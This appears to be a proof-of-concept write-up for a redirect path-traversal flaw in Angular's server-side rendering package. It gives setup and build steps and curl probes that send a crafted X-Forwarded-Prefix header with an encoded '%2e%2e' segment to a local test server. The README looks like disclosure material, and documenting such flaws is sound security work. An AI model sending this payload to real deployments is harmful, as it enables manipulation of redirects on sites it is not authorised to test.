# PoC — `X-Forwarded-Prefix` Encoded Dot-Segment Traversal

Tested on `@angular/ssr@21.2.8` / `@angular/build@21.2.8`, Node 25, darwin/arm64.

## Scaffold

`ng new xfp-traversal --ssr` defaults. Post-scaffold changes:

1. `angular.json` — `security.allowedHosts: ["example.com"]`.
2. `src/app/app.routes.server.ts` — `RenderMode.Prerender` → `RenderMode.Server` (per-request SSR).
3. `src/app/app.routes.ts` + `src/app/home.component.ts` — `{ path: 'go', redirectTo: 'home' }` canonical Angular Router redirect pattern.
4. `src/server.ts` — remove `isMainModule(...)` gate to keep the compiled server listening under `/tmp` symlinks on macOS. No other changes; the canonical Express handler and `AngularNodeAppEngine.handle()` are intact.

No modification to `targets/angular-cli` source. All vulnerable code is the shipped `@angular/ssr@21.2.8` in `node_modules`.

## Install + build

```
npm install
npx ng build
```

## Run

```
PORT=4300 node dist/xfh-comma-leak/server/server.mjs
# → http://127.0.0.1:4300
```

(The build output folder is `dist/xfh-comma-leak/` because the project name in `angular.json` was carried over from the port-pivot scaffold. Rename cosmetic; functionality unchanged.)

## Three probes

```
# A. Baseline — legitimate prefix
curl -si http://127.0.0.1:4300/go -H 'Host: example.com' -H 'X-Forwarded-Prefix: /safe'
# → 302, location: /safe/home

# B. Exploit — encoded dot-segment
curl -si http://127.0.0.1:4300/go -H 'Host: example.com' -H 'X-Forwarded-Prefix: foo/%2e%2e/bar'
# → 302, location: /foo/%2e%2e/bar/home
# Browser normalizes Location to /bar/home

# C. Control — literal dot-segment (correctly rejected)
curl -si http://127.0.0.1:4300/go -H 'Host: example.com' -H 'X-Forwarded-Prefix: foo/../bar'
# → 400, 'Header "x-forwarded-prefix" must not ... contain ".", ".." path segments.'
```

Evidence capture is in `../evidence/`.

## Browser normalization proof (optional)

The `Location: /foo/%2e%2e/bar/home` value is emitted verbatim by the server. The traversal completes at the client when the browser follows the redirect:

```js
new URL('/foo/%2e%2e/bar/home', 'https://example.com/go').pathname
// → '/bar/home'
```

Run headless Chromium against a small redirect-replay harness to confirm end-to-end.

## Cleanup

```
pkill -f "dist/.*server/server.mjs"
```
